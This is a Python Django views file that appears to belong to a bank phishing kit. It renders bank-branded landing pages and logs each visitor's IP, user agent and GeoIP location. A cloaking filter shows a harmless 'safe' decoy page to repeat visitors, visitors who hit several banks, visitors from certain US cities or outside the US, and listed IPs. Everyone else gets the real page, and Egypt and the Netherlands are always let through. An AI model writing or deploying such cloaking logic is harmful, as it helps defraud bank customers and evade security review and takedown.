# Create your views here.

from django.shortcuts import render_to_response, HttpResponse
from django.conf import settings
from .models import Keyword, LandingPage, Visitor
from pygeoip import GeoIP
import datetime

geoip = GeoIP(settings.GEOIP_DB_PATH)

def get_landing_page(request, bank_keyword, lp='lp5'):
    v = save_visitor(request, bank_keyword, lp)
    try:
        bank = Keyword.objects.get(keyword=bank_keyword)
    except Keyword.DoesNotExist:
        return HttpResponse('Bank not found in system')
    logo = bank.image.url
    if v.country_code in ['EG', 'NL']: #Allow Egypt and Netherlands always
        v.cloaked = False
        v.reason = ''
        v.save()
#    return render_to_response('%s/safe.html' % lp,locals())
    if v.cloaked:
        return render_to_response('%s/safe.html' % lp,locals())
    return render_to_response('%s/index.html' % lp,locals())


def ip_details(request):
    ip =  request.META.get('HTTP_X_REAL_IP', '')
    ip = request.META['REMOTE_ADDR']
    ip = '93.174.93.224'
    geo_data = geoip.record_by_addr(ip)
    print(geo_data)
    return HttpResponse(geo_data.items())



bad_ips = [#'208.43.90.178',
           '50.28.69.79',
           '67.227.83.121',
           ]

#USE ONLY LOWERCASE
cities = ['dallas',
          'irvine',
          'los angeles']
states = ['']
allowed_country = ['us']

def legitimate_visitor(ip, geo_data, v):
    visits = Visitor.objects.filter(ip=ip)
    another_bank = Visitor.objects.filter(ip=ip).exclude(keyword = v.keyword)
#    print(visits)
    number_of_visits = len(visits)
    if number_of_visits > 3:
        return 'visted %s times' % number_of_visits
    if another_bank:
        return 'another bank'
    if geo_data.get('city','').lower() in cities:
        return 'city'
    if geo_data.get('region_name','').lower() in states:
        return 'region_name'
    if not geo_data.get('country_code','').lower() in allowed_country:
        return 'country_code'
    if ip in bad_ips:
        return 'ip'
    return ''


def save_visitor(request, keyword, lp):
    v = Visitor()
    v.text = ''
    v.visit_datetime = datetime.datetime.now()
    v.ip = request.META.get('HTTP_X_REAL_IP', '')
    v.ua = request.META['HTTP_USER_AGENT'][:100]
    v.keyword = keyword
    v.lp = lp
    v.dt = datetime.datetime.now()
    geo_data = geoip.record_by_addr(v.ip)
    if geo_data is None:
        geo_data = {}
    v.city = geo_data.get('city','').lower()
    v.state = geo_data.get('region_name','')
    v.country_code = geo_data.get('country_code','')
    v.zip_code = geo_data.get('postal_code','')
    print(legitimate_visitor(v.ip, geo_data, v))
    v.reason = legitimate_visitor(v.ip, geo_data, v)
    if v.reason: #Reason to cloak
        v.cloaked = True
    else:
        v.cloaked = False #no need to cloak
        print('Cloaking needed')
    v.save()
    return v
